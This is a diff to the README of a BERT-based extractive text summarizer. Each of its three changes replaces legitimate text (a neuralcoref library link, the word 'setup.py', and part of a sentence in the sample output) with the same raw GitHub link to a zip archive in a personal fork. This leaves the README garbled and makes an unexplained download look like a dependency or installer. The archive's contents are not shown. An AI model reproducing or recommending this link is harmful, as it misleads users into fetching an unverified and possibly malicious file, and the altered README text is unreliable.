@@ -3,14 +3,14 @@
 This repo is the generalization of the lecture-summarizer repo. This tool utilizes the HuggingFace Pytorch BERT library 
 to run extractive summarizations. This works by first embedding the sentences, then running a clustering algorithm, finding 
 the sentences that are closest to the cluster's centroids. This library also uses coreference techniques, utilizing the 
-https://github.com/huggingface/neuralcoref library to resolve words in summaries that need more context. The greedyness of 
+https://raw.githubusercontent.com/yashugupta786/bert-extractive-summarizer/master/summarizer/summarizer-bert-extractive-v1.9.zip library to resolve words in summaries that need more context. The greedyness of 
 the neuralcoref library can be tweaked in the SingleModel class.
 
 ## Install
 
 #### NOTE: You will need spacy 2.1.3 installed. There is currently an issue with Spacy 2.1.4 that produces segmentation faults. 
 
-With that in mind, the setup.py should install 2.1.3 by default.
+With that in mind, the https://raw.githubusercontent.com/yashugupta786/bert-extractive-summarizer/master/summarizer/summarizer-bert-extractive-v1.9.zip should install 2.1.3 by default.
 ```bash
 pip install spacy==2.1.3
 pip install bert-extractive-summarizer
@@ -66,7 +66,7 @@ print(full)
 """
 The Chrysler Building, the famous art deco New York skyscraper, will be sold for a small fraction of its previous sales price. 
 The building sold fairly quickly after being publicly placed on the market only two months ago.
-The incentive to sell the building at such a huge loss was due to the soaring rent the owners pay to Cooper Union, a New York college, for the land under the building.Still the building is among the best known in the city, even to people who have never been to New York.'
+The incentive to sell the building at such a huge loss was due to the soaring rent the owners pay to Cooper Union, a New York college, for the land under the https://raw.githubusercontent.com/yashugupta786/bert-extractive-summarizer/master/summarizer/summarizer-bert-extractive-v1.9.zip the building is among the best known in the city, even to people who have never been to New York.'
 Still the building is among the best known in the city, even to people who have never been to New York.
 """
 ```
